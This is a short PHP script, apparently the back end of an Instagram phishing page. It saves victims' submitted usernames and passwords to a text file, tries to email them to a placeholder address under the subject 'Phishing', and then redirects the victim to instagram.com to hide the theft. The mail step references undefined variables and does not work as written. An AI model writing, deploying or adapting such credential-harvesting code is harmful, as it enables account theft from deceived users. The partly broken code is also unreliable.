<?php

	file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND) or die("unable to open file");

	$mail_to = "someone@example.com";
	$msg = $username . "\n" . $pw;
    mail($mail_to,"Phishing",$msg) or die("unable to send email");

	header('Location: https://instagram.com');
	exit();
?>